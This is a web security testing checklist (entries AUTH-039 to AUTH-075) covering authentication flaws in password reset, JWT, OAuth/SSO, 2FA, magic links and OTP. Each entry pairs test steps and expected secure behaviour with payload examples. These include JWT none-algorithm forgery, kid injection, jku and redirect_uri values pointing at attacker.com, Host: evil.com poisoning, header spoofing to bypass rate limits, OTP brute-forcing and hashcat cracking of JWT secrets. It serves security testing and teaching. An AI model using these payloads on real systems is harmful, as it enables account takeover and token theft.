**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset multiple times rapidly 2. Check if rate limiting exists 3. Check if multiple valid tokens coexist 4. Test email bombing

**Expected Result:** Application should rate limit reset requests and invalidate previous tokens when new one is issued

**Payload Example:**

```
Send 50 POST /forgot-password requests in 1 minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Intruder / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-040 — Password Reset with Old Password Still Working
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Note current password 2. Request and complete password reset 3. Try logging in with old password 4. Check if old sessions are invalidated

**Expected Result:** Old password should not work after reset and all existing sessions should be terminated

**Payload Example:**

```
Login with old password after successful reset
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-041 — JWT None Algorithm Attack
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture JWT token 2. Decode and change algorithm to none 3. Remove signature 4. Send modified token

**Expected Result:** Application should reject tokens with none algorithm and validate algorithm server-side

**Payload Example:**

```
Header {"alg":"none","typ":"JWT"} + payload {"sub":"admin","role":"admin"} -> base64url(header)+"."+base64url(payload)+"." (empty signature). Tools: jwt_tool -X a
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite / jwt.io

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-042 — JWT Algorithm Confusion (RS256 to HS256)
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Obtain public key 2. Change JWT algorithm from RS256 to HS256 3. Sign token with public key as HMAC secret 4. Send modified token

**Expected Result:** Application should enforce expected algorithm and not allow algorithm switching

**Payload Example:**

```
Change alg:RS256 to alg:HS256 then sign with public key
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite / Custom Scripts

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-043 — JWT Secret Key Brute Force
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture valid JWT token 2. Use jwt_tool or hashcat with wordlist to crack HMAC secret 3. If cracked forge arbitrary tokens

**Expected Result:** JWT should use strong cryptographic secrets (minimum 256 bits random)

**Payload Example:**

```
hashcat -m 16500 jwt.txt wordlist.txt|jwt_tool -C -d wordlist.txt
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** hashcat / jwt_tool / John the Ripper

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-044 — JWT Token Expiration Not Enforced
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture JWT token 2. Wait beyond exp claim time 3. Use expired token to access resources 4. Check if server validates exp claim

**Expected Result:** Application should reject expired tokens with appropriate error message

**Payload Example:**

```
Use token after exp timestamp has passed
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite / jwt.io / Postman

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-045 — JWT Signature Not Verified
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture JWT token 2. Modify payload claims without updating signature 3. Send tampered token 4. Check if server accepts it

**Expected Result:** Server must validate JWT signature before trusting any claims

**Payload Example:**

```
Modify {"role":"user"} to {"role":"admin"} without resigning
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite / jwt_tool / jwt.io

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-046 — JWT Sensitive Data Exposure in Payload
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture JWT token 2. Decode payload (base64) 3. Check for sensitive information like passwords PII or internal data

**Expected Result:** JWT payload should not contain sensitive data as it is only base64 encoded not encrypted

**Payload Example:**

```
Decode token and look for password|ssn|credit_card|internal_ip
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt.io / Burp Suite / Base64 decoder

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-047 — JWT Token Stored Insecurely
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Login and check where JWT is stored 2. Check localStorage sessionStorage cookies 3. Verify cookie flags (HttpOnly Secure SameSite)

**Expected Result:** JWT should be stored in HttpOnly Secure cookies with SameSite flag not in localStorage

**Payload Example:**

```
Check document.cookie|localStorage.getItem('token')|sessionStorage
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-048 — JWT Kid Header Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Check if JWT uses kid (Key ID) header 2. Inject path traversal or SQL injection in kid parameter 3. Point to known file or manipulate key lookup

**Expected Result:** Application should validate and sanitize kid parameter

**Payload Example:**

```
{"kid":"../../dev/null"alg:"HS256"}|{"kid":"key1' UNION SELECT 'secret'--"}
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** jwt_tool / Burp Suite

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## AUTH-049 — JWT JKU/X5U Header Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Check if JWT contains jku or x5u header 2. Change URL to attacker-controlled server hosting malicious JWKS 3. Sign token with attacker key

**Expected Result:** Application should whitelist allowed JKU/X5U URLs or not use these headers

**Payload Example:**

```
{"jku":"https://attacker.com/.well-known/jwks.json"}
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** jwt_tool / Burp Suite

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## AUTH-050 — JWT Refresh Token Abuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** JWT Token - JWT in Authorization header / cookie: header + claims

**Test Steps:** 1. Capture refresh token 2. Use refresh token after access token revocation 3. Check if refresh token is rotated after use 4. Test refresh token expiry

**Expected Result:** Refresh tokens should be rotated on use expire appropriately and be revokable

**Payload Example:**

```
POST /api/token/refresh with old refresh token after logout
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AUTH-051 — OAuth Open Redirect (WSTG-CLNT-04)
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Modify redirect_uri parameter in OAuth authorization request 2. Set to attacker domain 3. Check if OAuth provider redirects with auth code to attacker

**Expected Result:** OAuth provider should strictly validate redirect_uri against registered values

**Payload Example:**

```
redirect_uri=https://attacker.com|redirect_uri=https://target.com.attacker.com|redirect_uri=https://target.com@attacker.com
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-052 — OAuth CSRF (Missing State Parameter)
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Initiate OAuth flow 2. Check if state parameter is present 3. Remove or modify state parameter 4. Complete OAuth flow with manipulated state

**Expected Result:** Application should validate state parameter to prevent CSRF in OAuth flow

**Payload Example:**

```
Remove state parameter from callback URL|Use attacker-generated state
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-053 — OAuth Token Theft via Referer Header
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Complete OAuth callback 2. Check if access token is in URL fragment or query 3. Click external link from callback page 4. Check Referer header for token leak

**Expected Result:** OAuth tokens should not be exposed in URLs and Referrer-Policy should be set

**Payload Example:**

```
Check Referer header when navigating away from callback page with token in URL
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-054 — OAuth Account Takeover via Email Linking
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Create account with email X via OAuth 2. Create another account with same email via normal registration 3. Check if accounts merge or conflict

**Expected Result:** Application should properly handle email conflicts between OAuth and local accounts

**Payload Example:**

```
Register with same email via Google OAuth and email signup
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Manual Testing / Burp Suite

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-055 — OAuth Scope Manipulation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Capture OAuth authorization request 2. Modify scope parameter to request additional permissions 3. Complete flow 4. Check if escalated permissions are granted

**Expected Result:** Application should validate requested scopes and only grant pre-approved permissions

**Payload Example:**

```
scope=read to scope=read+write+admin|scope=openid+profile+email+admin
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-056 — SSO Token Replay Attack
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Capture SSO assertion/token during login 2. Replay the same assertion after initial use 3. Check if application accepts replayed tokens

**Expected Result:** SSO assertions should be single-use with timestamp and nonce validation

**Payload Example:**

```
Replay SAML assertion or OAuth code after first use
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / SAML Raider

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-057 — OAuth Client Secret Exposure
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth/SSO - OAuth/SSO flow: redirect_uri, state, code/token, id_token

**Test Steps:** 1. Check JavaScript source code for OAuth client secrets 2. Check mobile app code 3. Check API responses 4. Check public repositories

**Expected Result:** OAuth client secret should never be exposed in client-side code

**Payload Example:**

```
Search source for client_secret|api_key|oauth_secret
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** GitDorker / TruffleHog / Burp Suite

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## AUTH-058 — 2FA Bypass via Direct Page Access
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Complete first factor authentication 2. Note post-2FA dashboard URL 3. Instead of entering 2FA code directly navigate to dashboard URL

**Expected Result:** Application should enforce 2FA completion before allowing access to any authenticated endpoint

**Payload Example:**

```
After login directly access /dashboard or /api/user/profile
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-059 — 2FA Code Brute Force
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Trigger 2FA 2. Use Burp Intruder to brute force all possible OTP combinations 3. Check if rate limiting exists 4. Check if code changes after failed attempts

**Expected Result:** Application should rate limit 2FA attempts and lock after 3-5 failed tries

**Payload Example:**

```
Brute force 000000-999999 for 6 digit OTP|0000-9999 for 4 digit
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Intruder / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-060 — 2FA Code Reuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Receive 2FA code 2. Use code successfully 3. Try using same code again 4. Check if previously used codes are accepted

**Expected Result:** 2FA codes should be single-use and invalidated after successful verification

**Payload Example:**

```
Replay same OTP code after successful 2FA verification
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-061 — 2FA Code in Response Body
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Trigger 2FA code generation 2. Carefully examine response headers and body 3. Check for OTP or verification code in response

**Expected Result:** 2FA code should only be delivered through out-of-band channel (SMS Email Authenticator) not in API response

**Payload Example:**

```
Check response body for otp|code|token|verification fields
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-062 — 2FA Backup Code Abuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Generate backup codes 2. Use one backup code 3. Try reusing same backup code 4. Check if backup codes can be brute forced

**Expected Result:** Backup codes should be single-use high entropy and limited in number

**Payload Example:**

```
Reuse backup code|Brute force 8 character backup codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-063 — 2FA Disable Without Verification
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Navigate to 2FA settings 2. Try disabling 2FA without entering current password or 2FA code 3. Check if CSRF protection exists on disable endpoint

**Expected Result:** Disabling 2FA should require re-authentication with password and current 2FA code

**Payload Example:**

```
POST /api/2fa/disable without password or OTP verification
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-064 — 2FA Rate Limit Bypass via IP Rotation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** 2FA - 2FA/MFA verification step: code field, verify endpoint, session

**Test Steps:** 1. Attempt brute force of 2FA code 2. When rate limited rotate IP address 3. Add X-Forwarded-For headers 4. Continue brute force

**Expected Result:** Rate limiting should be per-account not per-IP and not bypassable via headers

**Payload Example:**

```
X-Forwarded-For: 127.0.0.1|X-Real-IP: random_ip|X-Originating-IP: random
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate Extension

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-065 — Magic Link Token Predictability
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Magic Link - Magic-login link: token param, Host header, delivery email

**Test Steps:** 1. Request multiple magic links 2. Analyze token entropy and patterns 3. Check if tokens are sequential or time-based 4. Attempt prediction

**Expected Result:** Magic link tokens should be cryptographically random with minimum 128-bit entropy

**Payload Example:**

```
Collect 50+ tokens and analyze patterns with Burp Sequencer
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Sequencer / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-066 — Magic Link Expiration Testing
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Magic Link - Magic-login link: token param, Host header, delivery email

**Test Steps:** 1. Request magic link 2. Wait beyond expected expiry (typically 15 min) 3. Click expired link 4. Check if authentication succeeds

**Expected Result:** Magic links should expire within 15 minutes and show clear expiration message

**Payload Example:**

```
Use magic link after 30 minutes|1 hour|24 hours
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Manual Testing / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-067 — Magic Link Multiple Use
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Magic Link - Magic-login link: token param, Host header, delivery email

**Test Steps:** 1. Request magic link 2. Use it to authenticate 3. Use same link again 4. Share link and try from different device

**Expected Result:** Magic links should be single-use and invalidated after first click

**Payload Example:**

```
Click same magic link twice from same or different browsers
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Manual Testing / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-068 — Magic Link Host Header Poisoning
**Test Category:** Host Header Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Magic Link - Magic-login link: token param, Host header, delivery email

**Test Steps:** 1. Request magic link 2. Intercept request and modify Host header to attacker domain 3. Check if email contains link with attacker domain

**Expected Result:** Application should not use Host header to construct magic link URLs

**Payload Example:**

```
Host: evil.com|X-Forwarded-Host: evil.com in POST /magic-link request
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## AUTH-069 — Magic Link Email Interception (HTTP)
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Magic Link - Magic-login link: token param, Host header, delivery email

**Test Steps:** 1. Check if magic link uses HTTPS 2. Check email delivery for TLS 3. Check if link token appears in URL query string

**Expected Result:** Magic links should use HTTPS and email should be sent over TLS encrypted connection

**Payload Example:**

```
Check link URL scheme http vs https
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Email Headers Analysis / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-070 — OTP Brute Force
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP 2. Use Burp Intruder to try all possible OTP values 3. Check for rate limiting 4. Monitor for lockout

**Expected Result:** Application should limit OTP attempts to 3-5 and implement cooldown period

**Payload Example:**

```
Brute force 0000-9999 (4 digit) or 000000-999999 (6 digit)
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Intruder / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-071 — OTP Reuse After Expiry
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP 2. Wait for expiry period 3. Try using expired OTP 4. Check server response

**Expected Result:** OTP should have strict expiry (2-5 minutes) and be rejected after expiration

**Payload Example:**

```
Use OTP after 10 minutes|30 minutes|1 hour
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-072 — OTP Bypass via Response Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Enter wrong OTP 2. Intercept server response 3. Change response from error to success 4. Forward modified response

**Expected Result:** OTP validation should be enforced server-side not dependent on client-side response

**Payload Example:**

```
Change {"verified":false} to {"verified":true}|Change 403 to 200
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Response Modification

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-073 — OTP in Response Body/Header
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP 2. Examine response body and headers carefully 3. Check for OTP value or hints in response

**Expected Result:** OTP should never be returned in API response and should only be delivered out-of-band

**Payload Example:**

```
Check response for otp|code|pin|verification in body or custom headers
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-074 — OTP Rate Limiting Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP multiple times rapidly 2. Check if old OTPs remain valid 3. Check if new OTP invalidates old 4. Test concurrent OTP requests

**Expected Result:** Only latest OTP should be valid and request rate should be limited

**Payload Example:**

```
Send 10 OTP requests in 10 seconds and try all received OTPs
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-075 — OTP Flood/SMS Bombing
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** OTP Verification - OTP verify endpoint: code field, delivery channel

**Test Steps:** 1. Request OTP endpoint repeatedly with victim phone number 2. Check if rate limiting per phone number exists 3. Test cost impact

**Expected Result:** Application should limit OTP requests per phone number per time period

**Payload Example:**

```
Send 100 POST /api/send-otp with same phone number
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Intruder / Custom Scripts

